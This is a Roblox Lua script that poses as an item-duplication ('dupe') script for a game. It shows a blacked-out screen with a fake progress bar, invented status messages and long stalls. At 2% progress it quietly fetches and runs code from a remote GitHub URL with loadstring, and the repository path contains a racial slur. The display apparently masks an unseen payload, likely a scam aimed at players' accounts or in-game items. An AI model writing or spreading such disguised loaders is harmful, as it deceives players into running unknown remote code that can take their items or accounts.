local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "LoadingUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 9999

-- Full black background
local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.ZIndex = 1

-- Top warning text
local topWarning = Instance.new("TextLabel", gui)
topWarning.Size = UDim2.new(1, 0, 0.08, 0)
topWarning.Position = UDim2.new(0, 0, 0, 0)
topWarning.BackgroundTransparency = 1
topWarning.Text = "⚠️🚨 IF YOU STUCK TRY TO REJOIN"
topWarning.Font = Enum.Font.GothamBold
topWarning.TextScaled = true
topWarning.TextColor3 = Color3.new(1, 1, 1)
topWarning.ZIndex = 3

-- Main frame
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0.45, 0, 0.5, 0)
frame.Position = UDim2.new(0.275, 0, 0.25, 0)
frame.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
frame.ZIndex = 3
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)

-- Loading script title (animated)
local loadingText = Instance.new("TextLabel", frame)
loadingText.Size = UDim2.new(1, 0, 0.1, 0)
loadingText.Position = UDim2.new(0, 0, 0.05, 0)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.TextScaled = true
loadingText.Text = "🚀🔄 Loading Script..."
loadingText.ZIndex = 4

-- Animated dots
local running = true
task.spawn(function()
	local d = 0
	while running and loadingText.Parent do
		loadingText.Text = "🚀🔄 Loading Script" .. string.rep(".", d % 4)
		d += 1
		wait(0.5)
	end
end)

-- Retry Button
local retryBtn = Instance.new("TextButton", frame)
retryBtn.Size = UDim2.new(0.5, 0, 0.1, 0)
retryBtn.Position = UDim2.new(0.25, 0, 0.18, 0)
retryBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 250)
retryBtn.Text = "🔁 Retry 🔧"
retryBtn.TextScaled = true
retryBtn.TextColor3 = Color3.new(1, 1, 1)
retryBtn.Font = Enum.Font.GothamBold
retryBtn.Visible = false
retryBtn.ZIndex = 4
Instance.new("UICorner", retryBtn).CornerRadius = UDim.new(0, 10)

-- Progress Bar Background
local pb = Instance.new("Frame", frame)
pb.Size = UDim2.new(0.85, 0, 0.1, 0)
pb.Position = UDim2.new(0.075, 0, 0.33, 0)
pb.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
pb.ZIndex = 4
Instance.new("UICorner", pb).CornerRadius = UDim.new(0, 10)

-- Progress Bar Fill
local bar = Instance.new("Frame", pb)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 140)
bar.ZIndex = 5
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 10)

-- Percentage Text
local perc = Instance.new("TextLabel", pb)
perc.Size = UDim2.new(1, 0, 1, 0)
perc.BackgroundTransparency = 1
perc.TextColor3 = Color3.new(1, 1, 1)
perc.Font = Enum.Font.GothamSemibold
perc.TextScaled = true
perc.Text = "0% Complete"
perc.ZIndex = 6

-- Info Label
local info = Instance.new("TextLabel", frame)
info.Size = UDim2.new(1, 0, 0.18, 0)
info.Position = UDim2.new(0, 0, 0.48, 0)
info.BackgroundTransparency = 1
info.Font = Enum.Font.GothamSemibold
info.TextColor3 = Color3.fromRGB(200, 200, 200)
info.TextScaled = true
info.TextWrapped = true
info.ZIndex = 4
info.Text = "⏳🛠️ PLEASE WAIT WE ARE CURRENTLY EXECUTING THE DUPE SCRIPT. THIS MAY TAKE A MOMENT. DON'T LEAVE."

-- Footer Credit
local credit = Instance.new("TextLabel", frame)
credit.Size = UDim2.new(1, 0, 0.1, 0)
credit.Position = UDim2.new(0, 0, 0.9, 0)
credit.BackgroundTransparency = 1
credit.Font = Enum.Font.Gotham
credit.TextColor3 = Color3.fromRGB(170, 170, 170)
credit.TextScaled = true
credit.Text = "👨‍💻📜 Script made by @growyourowngarden on TikTok"
credit.ZIndex = 4

-- Dynamic status message by % progress
local function getStatus(i)
	if i < 20 then return "🔍 Scanning environment..."
	elseif i < 40 then return "📦 Loading assets..."
	elseif i < 60 then return "⚙️ Preparing functions..."
	elseif i < 80 then return "📡 Connecting to server..."
	else return "🚀 Finalizing execution..."
	end
end

-- Progress fill function
local function fillProgress()
	running = true
	bar.Size = UDim2.new(0, 0, 1, 0)
	perc.Text = "0% Complete"

	for i = 1, 100 do
		local tween = TweenService:Create(bar, TweenInfo.new(0.2), { Size = UDim2.new(i / 100, 0, 1, 0) })
		tween:Play()

		perc.Text = i .. "% Complete"
		info.Text = getStatus(i)

		if i == 2 then
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Laggs/walapatoniggaa/refs/heads/main/gragraj"))()
			end)
		end

		if i == 50 or i == 60 then
			wait(2)
		elseif i == 80 or i == 90 then
			wait(60)
		else
			wait(math.random(8, 20) / 100)
		end
	end

	running = false
	retryBtn.Visible = true
end

-- Start progress
fillProgress()

-- Retry handler
retryBtn.MouseButton1Click:Connect(function()
	retryBtn.Visible = false
	fillProgress()
end)
